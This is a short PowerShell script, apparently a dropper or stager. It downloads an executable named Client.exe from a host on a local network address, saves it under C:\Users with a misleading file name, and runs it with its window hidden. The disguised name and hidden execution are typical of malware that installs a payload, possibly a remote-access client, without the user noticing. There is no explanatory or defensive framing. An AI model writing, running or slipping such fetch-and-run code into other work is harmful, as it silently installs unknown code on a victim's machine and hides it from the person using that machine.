$url = "http://192.168.2.192:5500/dist/Client.exe"
# Destation file
$dest = "c:\Users\apacheTestFileError.exe"
# Download the file
Invoke-WebRequest -Uri $url -OutFile $dest
# Inicitalize
Start-Process "C:\Users\apacheTestFileError.exe" -WindowStyle Hidden
